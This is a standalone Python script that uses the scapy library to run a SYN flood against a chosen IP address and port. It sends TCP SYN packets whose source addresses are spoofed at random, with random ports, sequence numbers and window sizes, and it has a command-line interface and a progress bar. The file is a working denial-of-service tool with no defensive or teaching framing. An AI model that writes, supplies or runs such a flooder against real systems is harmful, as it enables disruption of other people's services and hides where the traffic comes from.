from sys import stdout
from scapy.all import *
from random import randint
from argparse import ArgumentParser


def randomIP():
    ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
    return ip


def randInt():
    x = randint(1000, 9000)
    return x


def randomMAC():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )


def progress_bar(it, total):
    fillwith = "█"
    dec = 1
    leng = 50
    percent = ("{0:." + str(dec) + "f}").format(100 * (it / float(total)))
    fill_length = int(leng * it // total)
    bar = fillwith * fill_length + "-" * (leng - fill_length)
    print("\rProgress |%s| %s%% Complete" % (bar, percent), end="\r")


def SYN_Flood(dstIP, dstPort, counter):
    total = 0
    print("Packets are sending ...")

    for x in range(0, counter):
        # Ether_Frame = Ether()
        # Ether_Frame.scr = randomMAC()

        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = randInt()
        TCP_Packet.dport = int(dstPort)
        TCP_Packet.flags = "S"
        TCP_Packet.seq = randInt()
        TCP_Packet.window = randInt()

        send(IP_Packet / TCP_Packet, verbose=0)
        progress_bar(x, counter)
        total += 1

    progress_bar(counter, counter)
    stdout.write("\nTotal packets sent: %i\n" % total)


def main():
    parser = ArgumentParser()
    parser.add_argument("--destIP", "-d", help="destination IP address")
    parser.add_argument("--port", "-p", help="destination port number")
    parser.add_argument("--count", "-c", help="number of packets")
    parser.epilog = "Usage: python3 syn_flood.py -d 10.20.30.40 -p 8080 -c 10"

    args = parser.parse_args()

    if args.destIP is not None:
        if args.port is not None:
            if args.count is None:
                print(
                    "[!]You did not use --counter/-c parameter, so 1 packet will be sent.."
                )
                SYN_Flood(args.destIP, args.port, 1)

            else:
                SYN_Flood(args.destIP, args.port, int(args.count))

        else:
            print("[-]Please, use --port/-p to give destination's port!")
            print("[!]Example: -p 562")
            print("[?] -h for help")
            exit()
    else:
        print(
            """usage: py3_synflood_cmd.py [-h] [--destIP DEST_IP] [--port PORT]
                           [--count COUNT] [--version]
optional arguments:
  -h, --help            show this help message and exit
  --destIP DEST_IP, -d DEST_IP
                        destination IP address
  --port PORT, -p PORT  destination port number
  --count COUNT, -c COUNT
                        number of packets"""
        )
        exit()


main()
